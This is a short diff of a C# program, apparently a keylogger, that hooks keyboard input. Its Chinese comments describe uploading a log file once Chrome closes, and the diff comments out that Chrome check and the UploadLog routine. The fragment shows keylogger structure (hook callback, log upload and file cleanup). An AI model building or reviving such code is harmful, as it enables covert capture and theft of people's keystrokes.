@@ -168,14 +168,14 @@ namespace Statupwindow
             // 由於示範的關係，我就在這裡加入了傳送記錄檔和關閉程式的程式碼
             // 當 Google Chrome (chrome.exe) 完全關閉了的時候
             // 就退出程式，並上傳記錄檔
-            Process[] proc = Process.GetProcessesByName("chrome");
+            /*Process[] proc = Process.GetProcessesByName("chrome");
             if (proc.Length == 0)
             {
                 // 傳送記錄檔
                 UploadLog();
                 // 關閉程式
                 Environment.Exit(0);
-            }
+            }*/
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -183,7 +183,7 @@ namespace Statupwindow
         /// <summary>
         /// 傳送記錄檔函式
         /// </summary>
-        private static void UploadLog()
+        /*private static void UploadLog()
         {
             Random random = new Random();
             int rnd = random.Next();
@@ -206,7 +206,7 @@ namespace Statupwindow
                     File.Delete(target);
                 }
             }
-        }
+        }*/
 
 
         void Program_KeyUp(int nCode, IntPtr wParam, Keys Keys)
